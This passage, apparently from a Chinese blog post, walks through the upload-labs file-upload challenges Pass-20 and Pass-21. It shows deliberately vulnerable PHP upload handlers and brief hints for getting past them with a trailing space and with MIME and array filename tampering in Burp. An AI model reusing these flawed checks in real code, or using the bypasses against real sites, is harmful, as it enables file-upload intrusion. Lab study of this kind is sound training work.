alt=\"\" height=\"484\" src=\"..\\..\\static\\image\\32082ecb7f5a4985a1e90450d4aaa45c.png\" width=\"640\"/></p>\n<p>文件已经被上传了</p>\n<p><img alt=\"\" height=\"598\" src=\"..\\..\\static\\image\\d9a0fffb9a954d9e924c12adce17947b.png\" width=\"638\"/></p>\n<h1 id=\"Pass-20\">Pass-20</h1>\n<h2>代码：</h2>\n<pre><code class=\"language-php\">$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\");\n\n        $file_name = $_POST['save_name'];\n        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);\n\n        if(!in_array($file_ext,$deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH . '/' .$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) { \n                $is_upload = true;\n            }else{\n                $msg = '上传出错！';\n            }\n        }else{\n            $msg = '禁止保存为该类型文件！';\n        }\n\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}</code></pre>\n<h2>提示：</h2>\n<p>上传文件直接空格绕过</p>\n<p><img alt=\"\" height=\"226\" src=\"..\\..\\static\\image\\575f614897e84dca9ddf5ac3d35e8a14.png\" width=\"398\"/></p>\n<p>上传文件后直接右键打开链接</p>\n<p><img alt=\"\" height=\"345\" src=\"..\\..\\static\\image\\517e35c3ecb24260be3f4be9ce2b36e1.png\" width=\"644\"/></p>\n<h1 id=\"Pass-21\">Pass-21</h1>\n<h2>代码：</h2>\n<h3></h3>\n<pre><code class=\"language-php\">$is_upload = false;\n$msg = null;\nif(!empty($_FILES['upload_file'])){\n    //检查MIME\n    $allow_type = array('image/jpeg','image/png','image/gif');\n    if(!in_array($_FILES['upload_file']['type'],$allow_type)){\n        $msg = \"禁止上传该类型文件!\";\n    }else{\n        //检查文件名\n        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];\n        if (!is_array($file)) {\n            $file = explode('.', strtolower($file));\n        }\n\n        $ext = end($file);\n        $allow_suffix = array('jpg','png','gif');\n        if (!in_array($ext, $allow_suffix)) {\n            $msg = \"禁止上传该后缀文件!\";\n        }else{\n            $file_name = reset($file) . '.' . $file[count($file) - 1];\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH . '/' .$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $msg = \"文件上传成功！\";\n                $is_upload = true;\n            } else {\n                $msg = \"文件上传失败！\";\n            }\n        }\n    }\n}else{\n    $msg = \"请选择要上传的文件！\";\n}\n</code></pre>\n<h2>提示：</h2>\n<p>需要修改MIME TYPE类型，进行拼接</p>\n<h2>解题思路：</h2>\n<p>上传文件，BP抓包修改数据</p>\n<p><img alt=\"\" height=\"478\" src=\"..\\..\\static\\image\\10ef87726004481989c87c5d46b3c7a0.png\" width=\"633\"/></p>\n<p>文件上传成功后右键打开链接</p>\n<p><img alt=\"\" height=\"345\" src=\"..\\..\\static\\image\\ffd77558906f4480a3f274b13412d478.png\" width=\"643\"/></p>\n<p></p>\n</div>\n</div>", "first_tag": "PHP", "cpp": 0, "csharp": 0, "python": 0, "javascript": 1, "java": 0, "sql": 0, "php": 1, "time": "2022-08-31 14:58:44", "summary": "目录思维导图练习网站：注意：知识点代码：提示：解题思路：知识点：代码：提示：解题思路：本关需要使用自己搭建代码：提示：解题思路：代码：提示：解题思路：建议使用本机搭建的代码：提示：解题思路：先上传再上"}